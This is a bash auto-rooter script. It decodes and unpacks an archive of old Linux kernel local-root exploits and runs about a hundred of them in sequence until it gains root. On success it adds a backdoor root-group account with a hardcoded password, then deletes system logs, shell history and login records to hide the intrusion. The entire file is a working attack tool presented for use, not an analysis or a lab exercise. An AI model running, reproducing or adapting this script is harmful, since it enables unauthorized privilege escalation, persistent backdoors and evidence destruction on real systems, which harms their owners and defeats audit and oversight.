#!/bin/bash

fcheckr00t()
{
	if [ $(whoami) = 'root' ] 2> /dev/null
	then
		echo " [*] g0tr00t with exploit No. $CNT"
		GOTROOT=1
	else
		echo " [*] Failed to g0tr00t with expolit No. $CNT"
		CNT=$((CNT + 1))
	fi
}

fcheckdep()
{
	if [ $(which base64) -z ] 2> /dev/null
	then
		if [ $(which tar) -z ] 2> /dev/null
		then 
			echo '[*] base64 and tar not found, Try uploading exploits manually..'
			exit
		fi
	fi
}

funpack()
{
	if [ -f exploits.base64 ] 2> /dev/null
	then
		if [ ! -f exploits.tar.gz ] 2> /dev/null
		then
			cat exploits.base64 | base64 -d > exploits.tar.gz
			rm exploits.base64 
		fi
	fi
	tar -xf exploits.tar.gz
	rm exploits.tar.gz
}

fcheckdep
funpack

CNT=1
GOTROOT=''

cd exploits
chmod 777 *

if [ $GOTROOT -z ] 2> /dev/null
then
	./1-2
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./1-3
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./1-4
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-374.12.1.el5-2012
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./10
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./11
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./12
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./14
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./15.sh
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./15150
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./15200
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./16
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./16-1
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./18
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./18-5
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-1
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-32-46-2011
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-37
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-9-2005
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-9-2006
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-9-2006
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-9-2006
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.4.36.92.6.27.5\ -\ 2008\ Local\ root
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-164-2010
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-194
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-194.1-2010
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-194.2-2010
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-2011
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-274-2011
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-6-x86-2011
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.2-hoolyshit
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.20
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.20-2
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.22
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.22-2008
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.22-6-86_64-2007
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.23-2.6.24
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.23-2.6.24_2
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.23-2.6.27
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.24
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.27.7-generi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.28-2011
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.32-46.1.BHsmp
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.33
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-2011
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.34-2011
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.34-2011Exploit1
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.34-2011Exploit2
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.37
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.37-rc2
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.5_hoolyshit
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.6-34
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.6-34_h00lyshit
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.6_h00lyshit
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.7_h00lyshit
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.8-2008.9-67-2008
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.8-5_h00lyshit
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.8_h00lyshit
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-2004
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-2008
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-34
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-42.0.3.ELsmp
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-42.0.3.ELsmp-2006
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-55
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-55-2007-prv8
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-55-2008-prv8
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-672008
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9.2
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.91-2007
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2007
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2009-local
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2009-wunderbar
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2011 LocalRoot\ For\ 2.6.18-128.el5
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./21
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./3
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./3.4.6-9-2007
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./31
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./36-rc1
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./4
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./44
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./47
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./5
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./50
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./54
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./6
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./67
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./7
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./7-2
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./7x
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./8
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./9
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./90
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./94
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./Linux_2.6\(1\).12
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./Linux_2.6.12
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-2011
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./acid
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./d3vil
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./exp1
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./exp2
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./exp3
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./exploit
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./full-nelson
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./gayros
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./lenis.sh
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./local-2.6.9-2005-2006
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./local-root-exploit-gayros
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./priv4
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./pwnkernel
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./root.py
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./runx
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./tivoli
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./ubuntu
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./vmsplice-local-root-exploit
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./z1d-2011
	fcheckr00t
fi

cd ..
rm -rf exploits

if [ $GOTROOT = 1 ] 2> /dev/null
then
	RUSER='somesecguy'
	RPASS='g0tr00t'
	echo '[*] Adding r00t user..'
	useradd -g 0 -G root -M -s /bin/bash -p $RPASS $RUSER
	echo
	echo "[*] Added r00t user: $RUSER"
	echo "[*] p455w0rd:  $RPASS"
	echo "[*] Clearing logs.."
	rm -rf /tmp/logs 2> /dev/null
	rm -rf /root/.ksh_history 2> /dev/null
	rm -rf /root/.bash_history 2> /dev/null
	rm -rf /root/.bash_logout 2> /dev/null
	rm -rf /usr/local/apache/logs 2> /dev/null
	rm -rf /usr/local/apache/log 2> /dev/null
	rm -rf /var/apache/logs 2> /dev/null
	rm -rf /var/apache/log 2> /dev/null
	rm -rf /var/run/utmp 2> /dev/null
	rm -rf /var/logs 2> /dev/null
	rm -rf /var/log 2> /dev/null
	rm -rf /var/adm 2> /dev/null
	rm -rf /etc/wtmp 2> /dev/null
	rm -rf /etc/utmp 2> /dev/null
	GOTROOT=''
	echo "[*] You g0tr00t, horray for you..."
	whoami
	id
else
	echo "[*] You didn't g0tr00t, sucks to be you..."
	whoami
	id
fi
